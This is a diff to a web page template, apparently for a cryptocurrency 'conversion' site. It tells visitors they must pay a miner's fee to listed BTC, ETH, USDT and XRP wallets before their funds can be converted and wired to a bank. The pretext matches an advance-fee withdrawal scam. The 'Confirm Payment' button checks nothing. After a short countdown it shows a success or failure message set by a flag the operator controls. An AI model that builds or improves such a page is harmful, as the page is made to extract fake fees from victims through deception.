@@ -3,8 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Gas Billing Payment</title>
+  <title>Crypto Conversion Payment</title>
+
+  <!-- Bootstrap -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Font Awesome -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
 
   <style>
     body {
@@ -14,41 +19,74 @@
     .card {
       border: none;
       border-radius: 20px;
-      max-width: 850px;
+      max-width: 1100px; /* keeps card centered */
       width: 100%;
+      margin: auto;
     }
     h2 {
       font-weight: bold;
     }
     .writeup-box {
-      max-height: 320px;
-      overflow-y: auto;
       background: #ffffff;
       border: 1px solid #dee2e6;
       border-radius: 12px;
       padding: 20px;
-      text-align: left;
       line-height: 1.6;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
     }
-
-    .writeup-box {
-  max-height: none !important;
-  overflow: visible !important;
-}
-
-    .btc-box {
+    .wallet-option {
+      border: 1px solid #dee2e6;
+      border-radius: 12px;
+      padding: 18px;
+      background: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      transition: transform 0.2s ease;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+    .wallet-option:hover {
+      transform: translateY(-4px);
+    }
+    .wallet-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    .wallet-icon {
+      font-size: 2rem;
+      margin-right: 10px;
+      color: #198754;
+    }
+    .wallet-name {
+      font-size: 1.1rem;
+      font-weight: bold;
+    }
+    .wallet-address {
       background: #111;
       color: #0f0;
-      font-size: 1rem;
-      padding: 15px;
-      border-radius: 10px;
-      word-break: break-all;
+      font-size: 0.95rem;
+      padding: 10px;
+      border-radius: 8px;
       font-family: monospace;
       border: 2px dashed #198754;
+      word-break: break-all;
+      margin-bottom: 10px;
+      text-align: center;
     }
     .copy-btn {
       border-radius: 30px;
-      font-size: 0.9rem;
+      font-size: 0.85rem;
+      padding: 6px 15px;
+    }
+    .qr-code img {
+      border-radius: 12px;
+      border: 1px solid #dee2e6;
+      padding: 6px;
+      background: #fff;
+      max-width: 140px;
+      height: auto;
     }
     .btn-lg {
       padding: 14px 25px;
@@ -85,7 +123,7 @@
     <h2 class="mb-4 text-primary text-center">💱 Crypto Conversion Payment</h2>
     <hr>
 
-   <!-- Full Write-up -->
+  <!-- Full Write-up -->
 <div class="writeup-box mb-4 p-4 bg-white border rounded-3 shadow-sm">
   <p class="lead text-muted mb-3">
     This is to confirm that in order to complete the conversion of your cryptocurrency to fiat currency (USD) and process the subsequent wire transfer to your designated bank account, a miner’s fee must first be settled through the blockchain network.
@@ -112,7 +150,6 @@
   </p>
 </div>
 
-
     <!-- Conversion Info -->
     @if(isset($conversion))
       <div class="alert alert-info text-start mb-4 shadow-sm">
@@ -124,58 +161,119 @@
       </div>
     @endif
 
-    <!-- BTC Address -->
-    <div class="mb-4 text-center">
-      <p class="mb-2 fw-bold">📌 Send Miner’s Fee To:</p>
-      <div class="btc-box" id="btcAddress">contact support</div>
-      <button class="btn btn-sm btn-outline-dark mt-3 copy-btn" onclick="copyAddress()">📋 Copy Address</button>
-      <small id="copyMsg" class="d-block text-success mt-2" style="display:none;">✅ Address Copied!</small>
+    <!-- Wallets -->
+    <div class="mb-4">
+      <p class="fw-bold text-center mb-4">📌 Send Miner’s Fee To:</p>
+      <div class="row g-4 justify-content-center">
+        @foreach($wallets as $wallet)
+          <div class="col-12 col-md-6 col-lg-4 d-flex">
+            <div class="wallet-option w-100">
+              <div>
+                <div class="wallet-header">
+                  <div class="wallet-icon">
+                    @if($wallet->method == 'btc')
+                      <i class="fab fa-bitcoin"></i>
+                    @elseif($wallet->method == 'eth')
+                      <i class="fab fa-ethereum"></i>
+                    @elseif($wallet->method == 'usdt')
+                      <i class="fas fa-dollar-sign"></i>
+                    @elseif($wallet->method == 'xrp')
+                      <i class="fab fa-xrp"></i>
+                    @endif
+                  </div>
+                  <div class="wallet-name">{{ strtoupper($wallet->method) }}</div>
+                </div>
+                <div class="wallet-address">{{ $wallet->address }}</div>
+                <button class="btn btn-sm btn-outline-success copy-btn mb-2 w-100" data-address="{{ $wallet->address }}">
+                  <i class="far fa-copy"></i> Copy
+                </button>
+              </div>
+              <div class="qr-code mt-3 text-center">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data={{ $wallet->method }}:{{ $wallet->address }}" 
+                     alt="{{ strtoupper($wallet->method) }} QR Code">
+              </div>
+              <div class="wallet-info mt-3 small text-muted">
+                <p><strong>Network:</strong> {{ strtoupper($wallet->method) }}</p>
+                @if($wallet->destination_tag)
+                  <p><strong>Destination Tag:</strong> {{ $wallet->destination_tag }}</p>
+                @endif
+                <p><i class="fas fa-exclamation-circle"></i> Use the correct network to avoid loss of funds.</p>
+              </div>
+            </div>
+          </div>
+        @endforeach
+      </div>
     </div>
 
-    <!-- Confirm Payment Button -->
+    <!-- Confirmation -->
     <div class="text-center">
       <button id="confirmBtn" class="btn btn-success btn-lg w-100">Confirm Payment</button>
     </div>
-
-    <!-- Countdown Area -->
     <div id="countdownWrapper" class="text-center mt-4 d-none">
-      <h4 class="text-success">⏳ Processing Confirmation...</h4>
-      <p>Completing in <span id="countdown" class="countdown-number">5</span> seconds.</p>
+      @if (Auth::user()->withdrawal_status == 0)
+        <h4 class="text-warning">⏳ Conversion not confirmed yet...</h4>
+        <p>Checking in <span id="countdown" class="countdown-number">5</span> seconds.</p>
+      @elseif (Auth::user()->withdrawal_status == 1)
+        <h4 class="text-success">⏳ Processing Confirmation...</h4>
+        <p>Completing in <span id="countdown" class="countdown-number">5</span> seconds.</p>
+      @endif
     </div>
 
   </div>
 </div>
 
+<!-- Scripts -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 <script>
-  // Copy BTC address
-  function copyAddress() {
-    const btcAddress = document.getElementById("btcAddress").innerText;
-    navigator.clipboard.writeText(btcAddress).then(() => {
-      document.getElementById("copyMsg").style.display = "block";
-      setTimeout(() => document.getElementById("copyMsg").style.display = "none", 2000);
+  // Confirm button countdown
+  document.addEventListener("DOMContentLoaded", function () {
+    const confirmBtn = document.getElementById("confirmBtn");
+    const countdownWrapper = document.getElementById("countdownWrapper");
+    const countdownEl = document.getElementById("countdown");
+
+    if (confirmBtn) {
+      confirmBtn.addEventListener("click", function () {
+        confirmBtn.disabled = true;
+        confirmBtn.innerText = "Processing...";
+        countdownWrapper.classList.remove("d-none");
+
+        let timeLeft = 5;
+        const timer = setInterval(() => {
+          countdownEl.innerText = timeLeft;
+          timeLeft--;
+
+          if (timeLeft < 0) {
+            clearInterval(timer);
+            @if (Auth::user()->withdrawal_status == 0)
+              countdownWrapper.innerHTML =
+                '<div class="status-icon text-warning">⚠️</div>' +
+                '<h4 class="text-warning mt-3">Conversion not confirmed yet</h4>';
+            @elseif (Auth::user()->withdrawal_status == 1)
+              countdownWrapper.innerHTML =
+                '<div class="status-icon text-success">✅</div>' +
+                '<h4 class="text-success mt-3">Conversion completed successfully</h4>';
+            @endif
+            confirmBtn.disabled = false;
+            confirmBtn.innerText = "Confirm Payment";
+          }
+        }, 1000);
+      });
+    }
+  });
+
+  // Copy wallet address
+  document.querySelectorAll('.copy-btn').forEach(button => {
+    button.addEventListener('click', function() {
+      const address = this.getAttribute('data-address');
+      navigator.clipboard.writeText(address).then(() => {
+        this.innerHTML = '<i class="fas fa-check"></i> Copied!';
+        setTimeout(() => {
+          this.innerHTML = '<i class="far fa-copy"></i> Copy';
+        }, 2000);
+      });
     });
-  }
-
-  // Countdown logic
-  document.getElementById("confirmBtn").addEventListener("click", function () {
-    this.disabled = true;
-    this.innerText = "Processing...";
-    document.getElementById("countdownWrapper").classList.remove("d-none");
-
-    let timeLeft = 5;
-    const timer = setInterval(() => {
-      document.getElementById("countdown").innerText = timeLeft;
-      timeLeft--;
-
-      if (timeLeft < 0) {
-        clearInterval(timer);
-        document.getElementById("countdownWrapper").innerHTML =
-          '<div class="status-icon text-danger">❌</div><h4 class="text-danger mt-3">Payment Not Confirmed Yet</h4>';
-      }
-    }, 1000);
   });
 </script>
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
